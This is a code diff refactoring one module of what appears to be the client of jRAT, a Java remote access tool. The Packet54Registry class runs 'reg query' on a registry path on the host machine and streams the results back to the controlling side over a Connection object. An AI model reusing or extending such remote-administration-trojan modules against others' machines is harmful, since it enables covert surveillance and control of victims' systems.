@@ -1,10 +1,9 @@
 package jrat.module.registry;
 
-import jrat.common.io.StringWriter;
+import jrat.client.Connection;
 import jrat.client.packets.outgoing.AbstractOutgoingPacket;
 
 import java.io.BufferedReader;
-import java.io.DataOutputStream;
 import java.io.InputStreamReader;
 
 public class Packet54Registry extends AbstractOutgoingPacket {
@@ -16,9 +15,9 @@ public class Packet54Registry extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+	public void write(Connection con) throws Exception {
 		try {
-			sw.writeLine(path);
+            con.writeLine(path);
 			Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", path });
 
 			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
@@ -26,15 +25,15 @@ public class Packet54Registry extends AbstractOutgoingPacket {
 			String line;
 
 			while ((line = reader.readLine()) != null) {
-				dos.writeBoolean(true);
-				sw.writeLine(line);
+                con.writeBoolean(true);
+                con.writeLine(line);
 			}
 			reader.close();
 
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		} finally {
-			dos.writeBoolean(false);
+            con.writeBoolean(false);
 		}
 	}
 
